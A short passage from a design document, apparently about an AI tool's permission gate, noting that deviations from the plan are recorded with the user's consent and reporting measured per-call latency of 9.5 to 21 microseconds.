place the implementation deliberately departs from the step's plan text, with the
user asked and the reason recorded.

## Cost

Measured in `.dump/app/benchmarks/2026-09-18-permission-gate-cost.md`: 9.5 to 21 µs
median per tool call, dominated by the filesystem path check, with the policy
read cached at sub-microsecond.
